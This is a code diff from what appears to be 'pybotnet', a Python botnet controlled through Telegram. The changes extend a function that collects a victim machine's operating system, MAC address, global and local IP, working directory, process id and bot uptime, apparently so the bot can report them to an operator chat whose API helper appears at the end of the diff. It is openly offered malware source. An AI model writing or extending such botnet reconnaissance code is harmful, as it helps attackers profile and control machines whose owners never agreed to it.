@@ -8,6 +8,7 @@ import requests
 import json
 import platform
 
+from os import getcwd, listdir,  getpid
 from socket import gethostname, gethostbyname
 from uuid import getnode as get_system_mac_addres
 from bs4 import BeautifulSoup
@@ -58,9 +59,9 @@ def get_my_ip_server_3():
 
 
 def get_short_system_info() -> str:
-    '''pybotnet version, system mac addres, ip addres, operating system, pybotnet uptime'''
+    '''system mac addres, ip addres, operating system'''
 
-    short_system_info = f"""
+    short_system_info = f"""------system info------
 operating system: {platform.system()}
 mac addres: {get_system_mac_addres()}
 global ip: {get_my_global_ip()}"""
@@ -68,22 +69,21 @@ global ip: {get_my_global_ip()}"""
     return short_system_info
 
 
-def get_full_system_info(pybotnet_uptime='Unknown') -> str:
+def get_full_system_info(pybotnet_uptime=None) -> str:
     f'''return full system info: \n
-    get_short_system_info and system uptime, local ip
+    get_short_system_info and pybotnet up time, local ip, pybotnet version'''
 
-    '''
     full_system_info = f"""{get_short_system_info()}
 pybotnet up time: {pybotnet_uptime} Seconds
 local ip: {get_host_name_ip()}
+current route: {getcwd()}
+pid: {getpid()}
 pybotnet version: {settings.pybotnet_version}
-    """
+-----------------------"""
+
     # TODO: system uptime: {None}
 
     return full_system_info
-
-
-print(get_full_system_info())
 
 
 def make_send_message_api_url(TELEGRAM_TOKEN, ADMIN_CHAT_ID, message) -> str:
